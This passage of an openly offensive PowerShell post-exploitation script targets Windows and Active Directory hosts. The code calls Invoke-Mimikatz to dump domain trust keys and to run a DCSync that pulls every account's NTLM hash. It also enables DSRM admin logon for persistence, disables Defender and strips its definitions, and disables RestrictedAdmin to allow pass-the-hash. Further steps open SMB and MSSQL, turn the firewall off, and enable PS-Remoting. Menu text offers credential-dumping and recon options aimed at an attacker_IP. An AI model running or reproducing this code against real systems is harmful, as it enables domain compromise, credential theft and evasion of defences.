                $uniqueEntries[$uniqueKey] = $true
            }

            $username = $null
            $userID = $null
            $ntlm = $null
        }
    }

    if ($uniqueEntries.Count -gt 0) {
        Write-Output "--> [+] Local hashes retrieved!"
    }
    else {
        Write-Output "`n[-] Couldn't retrieve local hashes."
    }

    # ===== [ Extract trust keys if found ] ======================================
    Write-Output ""

    function Test-Admin {
        $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }

    $currentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $builtinAdminsSID = "S-1-5-32-544"
    $localAccountSID = "S-1-5-114"
    $userGroups = $currentIdentity.Groups | ForEach-Object { $_.Value }
    $domainUsersSIDPattern = "S-1-5-21-.+-513"
    $domainAdminsSIDPattern = "S-1-5-21-.+-512"
    $enterpriseAdminsSIDPattern = "S-1-5-21-.+-519"

    function IsMemberOfSpecialGroups {
        param ([string[]]$groups, [string[]]$patterns)
        foreach ($pattern in $patterns) {
            foreach ($group in $groups) {
                if ($group -match $pattern) {
                    return $true
                }
            }
        }
        return $false
    }

    $specialGroupsPatterns = @($domainUsersSIDPattern, $domainAdminsSIDPattern, $enterpriseAdminsSIDPattern)

    if (IsMemberOfSpecialGroups -groups $userGroups -patterns $specialGroupsPatterns) {
        $domainFlag = "/domain"
    }
    elseif ($userGroups -contains $builtinAdminsSID -or $userGroups -contains $localAccountSID) {
        Write-Output "[+] User is a local Administrator but not checked against special domain groups."
        $domainFlag = if ($domainFlag -eq "/domain") { "/domain" } else { "" }
    }
    else {
        Write-Output "[!] Could not determine if user is domain-joined."
        $domainFlag = $null
    }

    $partOfDomain = (Get-WmiObject Win32_ComputerSystem).PartOfDomain
        
    if ($partOfDomain -and $domainFlag -eq "/domain") {
        if (Test-Admin) {
                
            try {
                $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
                $domainController = $domain.FindDomainController()
                $domainControllerName = $domainController.Name.Split('.')[0]
                $currentDomainTrust = Get-NetDomainTrust
                $currentForestTrusts = Get-NetForestTrust

                    
                if ($currentDomainTrust.Count -eq 0 -and $currentForestTrusts.Count -eq 0) {
                    Write-Output "[-] No domain or forest trust links found."
                }
                else {
                    try {
                        $mimikatzOutput = Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName $domainControllerName -ErrorAction Stop
                    }
                    catch {
                        $mimikatzOutput = Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ErrorAction SilentlyContinue
                    }

                    # Parse out the trust keys if we were successful
                    if ($mimikatzOutput -and $mimikatzOutput -match "rc4_hmac_nt") {
                            
                        $trustRelationships = @()
                        $hashes = @()
                        $lines = $mimikatzOutput -split "`r?`n"

                        foreach ($line in $lines) {
                            if ($line -match "\[\s*(In|Out)(-\d+)?\s*\]\s*(\S+)\s*->\s*(\S+)") {
                                if ($null -ne $matches[2]) {
                                    $currentDirection = $matches[1] + $matches[2].Trim()
                                }
                                else {
                                    $currentDirection = $matches[1]
                                }
                                $currentSourceDomain = $matches[3]
                                $currentTargetDomain = $matches[4]

                                $description = "[$currentDirection] from $currentSourceDomain -> $currentTargetDomain"
                                $trustRelationships += $description
                            }
                        }
                          
                        foreach ($line in $mimikatzOutput -split "`r?`n") {
                            if ($line -match "rc4_hmac_nt\s+([a-fA-F0-9]{32})") {
                                $hash = $matches[1]
                                $hashes += $hash
                            }
                        }

                        $maxDescriptionLength = ($trustRelationships | Measure-Object -Property Length -Maximum).Maximum

                        if ($null -ne $trustRelationships) {
                            for ($i = 0; $i -lt $trustRelationships.Count; $i++) {
                                $finalDescription = "{0,-$maxDescriptionLength} :: {1}" -f $trustRelationships[$i], $hashes[$i]
                                Write-Output $finalDescription
                            }
                            Write-Output "--> [+] Trust keys successfully retrieved!`n`n"
                        }
                        else {
                            Write-Output"`n[-] Error in extracting trust keys.`n"
                        }
                    }
                }  # end else trustcheck
            }
            catch {
                Write-Output "[-] An unknown error occurred while checking trust links."
            } 
        } # end if test-admin
    } # end if partofdomain check

   
    $domainRole = (Get-WmiObject Win32_ComputerSystem).DomainRole

    if ($domainRole -eq 4 -or $domainRole -eq 5) {
        if (Test-Admin) {
                
            # ===== [ DCSync hash dump ] ======================================
            $domainControllerName = (Get-NetDomainController).Name
            $domainRootName = (Get-NetDomain).Name
            $command = '"token::elevate" "privilege::debug" "lsadump::dcsync /dc:{0} /domain:{1} /all"' -f $domainControllerName, $domainRootName
            $mimikatzOutput = Invoke-Mimikatz -Command $command -ErrorAction SilentlyContinue 2>$null

            $uniqueEntries = @{}
            $lines = $mimikatzOutput -split "`r?`n"
            $collecting = $false

            $username = $null
            $userID = $null
            $ntlm = $null

            foreach ($line in $lines) {
                if ($line -match "^\*\* SAM ACCOUNT \*\*") {
                    $collecting = $true
                }
                elseif ($collecting) {
                    if ($line -match "SAM Username\s+:\s+(\w+)") {
                        $username = $matches[1]
                    }
                    elseif ($line -match "Object Security ID\s+:\s+(S-1-5-\d+-\d+-\d+-\d+-\d+)") {
                        $userID = $matches[1]
                    }
                    elseif ($line -match "Hash NTLM:\s+([a-fA-F0-9]{32})") {
                        $ntlm = $matches[1]
                        $uniqueKey = "${username}:${ntlm}"

                        if (-not $uniqueEntries.ContainsKey($uniqueKey)) {
                            Write-Host "${username}:${userID}:${ntlm}:::"
                            $uniqueEntries[$uniqueKey] = $true
                        }

                        $username = $null
                        $userID = $null
                        $ntlm = $null
                        $collecting = $false
                    }
                }
            }

            if ($uniqueEntries.Count -gt 0) {
                Write-Output "--> [+] DCSync hashes retrieved!`n"
            }
            else {
                Write-Output "`n[-] Couldn't retrieve hashes.`n"
            }
                
            # ===== [ Enable DSRM Admin Login ] ======================================
            $path = "HKLM:\System\CurrentControlSet\Control\Lsa\"
            $name = "DsrmAdminLogonBehavior"
            $value = 2
                        
            if ($null -ne (Get-ItemProperty -Path $path -Name $name -ErrorAction SilentlyContinue)) {
                $currentValue = (Get-ItemProperty -Path $path -Name $name).$name
                if ($currentValue -eq $value) {
                    Write-Output "`n[+] DSRM Admin is enabled."
                }
                else {
                    Set-ItemProperty -Path $path -Name $name -Value $value
                    Write-Output "[+] DSRM Admin Logon Behavior value updated to $value."
                }
            }
            else {
                New-ItemProperty -Path $path -Name $name -Value $value -PropertyType DWORD -ErrorAction Stop
                Write-Output "[+] DSRM Admin Logon Behavior key created with value $value."
            }

        }
        else {
            Write-Output "[-] You do not have administrative privileges. Exiting..."
        }
    }
    else {
        Write-Output "[!] Not a Domain Controller. Cannot enable DSRM Admin or DCSync."
    }
}


$script = {

    # ===== [ Data visualization helper functions ] ======================================
    function Print-BoxedOutput {
        param ([string[]]$Lines)

        $maxWidth = $Lines | Measure-Object -Property Length -Maximum | Select-Object -ExpandProperty Maximum
        $topAndBottomBorder = "+" + ('-' * ($maxWidth + 2)) + "+"

        Write-Output $topAndBottomBorder
        foreach ($line in $Lines) {
            if ($line -eq "") {
                Write-Output "|$(' ' * ($maxWidth + 2))|"
            }
            else {
                $paddedLine = $line.PadRight($maxWidth)
                Write-Output "| $paddedLine |"
            }
        }
        Write-Output $topAndBottomBorder
    }

    function Wrap-Text {
        param (
            [string]$Text,
            [int]$MaxWidth,
            [int]$IndentAfterFirstLine
        )

        $words = $Text -split ' '
        $currentLine = ''
        $lines = @()
        $firstLine = $true

        foreach ($word in $words) {
            if ($firstLine) {
                if (($currentLine + $word).Length -lt $MaxWidth) {
                    $currentLine += "$word "
                }
                else {
                    $lines += $currentLine.TrimEnd()
                    $currentLine = ' ' * $IndentAfterFirstLine + "$word "
                    $firstLine = $false
                }
            }
            else {
                if (($currentLine + $word).Length -lt ($MaxWidth - $IndentAfterFirstLine)) {
                    $currentLine += "$word "
                }
                else {
                    $lines += $currentLine.TrimEnd()
                    $currentLine = ' ' * $IndentAfterFirstLine + "$word "
                }
            }
        }
        if ($currentLine) { $lines += $currentLine.TrimEnd() }

        return $lines
    }

    # ===== [ Admin Check] ======================================
    function Test-Admin {
        $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }

    # ===== [ AppLocker check ] ======================================
    try {
        $appLockerKey = Get-ChildItem -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe" -ErrorAction Stop
        if ($appLockerKey) {
            Write-Output "`n[!] AppLocker restrictions are in effect"
            $lines = @()
            $appLockerPolicy = Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

            if ($appLockerPolicy) {
                $index = 1
                foreach ($ruleCollection in $appLockerPolicy) {
                    if ($index -gt 1) {
                        $lines += "=" * 60
                    }
                    $descriptionLines = Wrap-Text -Text "[$index] : $($ruleCollection.Description)" -MaxWidth 60 -IndentAfterFirstLine 8
                    $lines += $descriptionLines
                    $index++
                }
            }
            else {
                $lines += "[-] No AppLocker policies were retrieved."
            }
            Print-BoxedOutput -Lines $lines
        }
    }
    catch {
        Write-Output "[+] AppLocker not enabled"
    }

    if (Test-Admin) {
        # ===== [ Kill AV ] ======================================
        $currentPreferences = Get-MpPreference

        if ($currentPreferences.DisableRealtimeMonitoring -eq $true) {
            Write-Output "`n[+] AV Real-time Monitoring is already disabled."
        }
        else {
            Write-Output "`nDisabling Real-time Monitoring and IOAV Protection..."
            Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true -ErrorAction SilentlyContinue 2>$null
            Write-Output "`nRunning MpCmdRun to remove definitions..."
            cmd /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
            Write-Output "`n[+] AV and definitions removal completed."
        }
    }
    else {
        Write-Output "`n[-] Not privileged to disable AV."
    }
    

    if (Test-Admin) {
        # ===== [ Defeat RestrictedAdminMode ] ======================================
        $registryPath = "HKLM:\System\CurrentControlSet\Control\Lsa"
        $propertyName = "DisableRestrictedAdmin"
        $propertyValue = (Get-ItemProperty -Path $registryPath -Name $propertyName -ErrorAction SilentlyContinue).$propertyName

        if ($propertyValue -eq $null) {
            Write-Output "The DisableRestrictedAdmin property does not exist. Creating and setting value to 0."
            New-ItemProperty -Path $registryPath -Name $propertyName -Value 0 -PropertyType DWORD -Force *> $null
            Write-Output "`n[+] RestrictedAdminMode successfully disabled."
        }
        elseif ($propertyValue -eq 1) {
            Write-Output "RestrictedAdminMode is enabled. Updating value to 0 to disable RestrictedAdminMode."
            Set-ItemProperty -Path $registryPath -Name $propertyName -Value 0
            Write-Output "`n[+] RestrictedAdminMode successfully disabled."
        }
        else {
            Write-Output "[+] RestrictedAdminMode is already NOT enabled."
        }
    }
    else {
        Write-Output "[-] Not privileged to perform registry edits."
    }
        

    # ===== [ Relax firewall rules for SMB + MSSQL ] ======================================
    if (Test-Admin) {
        $smbRuleExists = Get-NetFirewallRule -DisplayName "Allow SMB Inbound" -ErrorAction SilentlyContinue

        if ($smbRuleExists) {
            Write-Output "[+] Firewall Rule for SMB already exists."
        }
        else {
            Write-Output "Creating Firewall Rule for SMB Inbound connections..."
            New-NetFirewallRule -DisplayName "Allow SMB Inbound" -Direction Inbound -LocalPort 445 -Protocol TCP -Action Allow *> $null
            Write-Output "`n[+] Firewall Rule for SMB created successfully."
        }

        $mssqlRuleExists = Get-NetFirewallRule -DisplayName "Allow MSSQL Inbound" -ErrorAction SilentlyContinue

        if ($mssqlRuleExists) {
            Write-Output "[+] Firewall Rule for MSSQL already exists."
        }
        else {
            Write-Output "Creating Firewall Rule for MSSQL Inbound connections..."
            New-NetFirewallRule -DisplayName "Allow MSSQL Inbound" -Direction Inbound -LocalPort 1433 -Protocol TCP -Action Allow *> $null
            Write-Output "`n[+] Firewall Rule for MSSQL created successfully."
        }

        cmd /c "netsh advfirewall set allprofiles state off" *> $null
        Write-Output "[+] Firewall disabled."

    }
    else {
        Write-Output "[-] Not privileged to modify firewall rules."
    }
   

    if (Test-Admin) {
        # ===== [ Enable PS-Remoting and SMB ] ======================================
        if ([bool](Test-WSMan -ComputerName $env:COMPUTERNAME -ErrorAction SilentlyContinue)) {
            Write-Output "[+] PowerShell Remoting is already enabled."
        }
        else {
            Write-Output "Enabling PowerShell Remoting..."
            Enable-PSRemoting -Force *> $null
            Write-Output "`n[+] PowerShell Remoting enabled successfully.`n"
        }

        # ===== [ Enable SMB ] ======================================
        $smbService = Get-Service -Name LanmanServer

        if ($smbService.Status -eq 'Running') {
            Write-Output "[+] SMB Service is already running."
        }
        else {
            Write-Output "Starting SMB Service..."
            Start-Service -Name LanmanServer *> $null
            Write-Output "`n[+] SMB Service started."
        }
    }
    else {
        Write-Output "[-] Not privileged to start services.`n"
    }

    # ===== [ Check for LSA Protection ] ======================================
    $lsaProperty = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction SilentlyContinue

    if ($null -ne $lsaProperty) {
        $lsaProtection = $lsaProperty.RunAsPPL
    }
    else {
        $lsaProtection = $null
    }

    # ===== [ Helper menus ] ======================================    
    if ($lsaProtection -eq 1) {
        Write-Output "[!] LSA Protection currently enabled.`n"
        Write-Output "Options:"
        Write-Output "`tgetcreds - retrieve hashes from LSASS procdump."
        Write-Output "`t`tpositional arguments: [-ipaddress attacker_IP]"
        Write-Output "`t`t`t`toptional: [-lsa]  remove LSA protection`n"
        Write-Output "`tadrecon - quick AD recon using Microsoft AD module."
        Write-Output "`t`tpositional arguments: [-ipaddress attacker_IP -port attacker_port (default: 80)]`n"
    }
    else {
        Write-Output "LSA Protection is not enabled or the setting was not found.`n"
        Write-Output "Options:"
        Write-Output "`tgetcreds - retrieve hashes from LSASS procdump."
        Write-Output "`t`tpositional arguments: [-ipaddress attacker_IP]"
        Write-Output "`t`t`t`toptional: [-lsa]  remove LSA protection`n"
        Write-Output "`tadrecon - quick AD recon using Microsoft AD module."
        Write-Output "`t`tpositional arguments: [-ipaddress attacker_IP -port attacker_port (default: 80)]`n"
    }
}
Invoke-Command -ScriptBlock $script